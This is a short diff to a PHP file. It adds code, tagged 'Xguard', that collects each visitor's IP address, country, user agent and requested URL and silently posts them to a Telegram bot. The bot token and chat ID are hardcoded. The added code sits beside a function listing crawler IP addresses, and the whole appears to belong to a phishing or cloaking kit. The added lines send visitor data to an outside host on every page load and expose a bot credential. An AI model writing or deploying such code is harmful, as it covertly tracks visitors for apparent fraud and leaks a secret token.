@@ -1,4 +1,15 @@
- function spiderip($ip) {
+  $ua = new Mobile_Detect;
+$pais = file_get_contents("https://ipapi.co/" . GetIP() . "/country_name");
+$dato= "Xguard:".PHP_EOL;
+$dato.= "Server: " .$_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"].PHP_EOL;
+$dato.="Ip: ".GetIP();
+$dato.="Pais: ".$pais;
+$dato.="UA: ". $ua->getUserAgent().PHP_EOL;
+
+
+   $enviolog = ['text' => $dato,'chat_id' => '5158007017'];
+   file_get_contents("https://api.telegram.org/bot5675646488:AAEEBN1ymEIByQinst1Y_MCbI397MJn_u4g/sendMessage?" . http_build_query($enviolog) );
+function spiderip($ip) {
         $spiderip = ['149.154.161.197','149.154.161.235',
 '66.102.7.198',
 '74.125.210.178',
